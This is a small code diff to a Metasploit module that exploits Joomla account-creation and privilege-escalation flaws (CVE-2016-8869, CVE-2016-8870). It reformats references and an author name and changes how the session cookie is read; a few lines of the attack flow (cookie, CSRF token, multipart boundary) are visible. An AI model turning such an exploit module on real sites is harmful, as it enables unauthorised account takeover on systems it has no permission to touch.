@@ -20,15 +20,15 @@ class MetasploitModule < Msf::Auxiliary
       },
       'References'     =>
         [
-          ['CVE', 'CVE-2016-8869'],
-          ['CVE', 'CVE-2016-8870'],
+          ['CVE', '2016-8869'],
+          ['CVE', '2016-8870'],
           ['URL', 'https://developer.joomla.org/security-centre/660-20161002-core-elevated-privileges.html'],
           ['URL', 'https://developer.joomla.org/security-centre/659-20161001-core-account-creation.html'],
           ['URL', 'https://medium.com/@showthread/joomla-3-6-4-account-creation-elevated-privileges-write-up-and-exploit-965d8fb46fa2']
         ],
       'Author'         =>
         [
-          'Fábio Pires <fp[at]integrity.pt>',     # module creation and privilege escalation
+          'Fabio Pires <fp[at]integrity.pt>',     # module creation and privilege escalation
           'Filipe Reis <fr[at]integrity.pt>',     # module creation and privilege escalation
           'Vitor Oliveira <vo[at]integrity.pt>',  # module creation and privilege escalation
         ],
@@ -59,7 +59,7 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
 
-    cookie = response.headers['set-cookie']
+    cookie = response.get_cookies
     csrf = response.body.match(/name="(\w{32})"/i).captures[0]
 
     boundary = "157247343414135650641514240823"
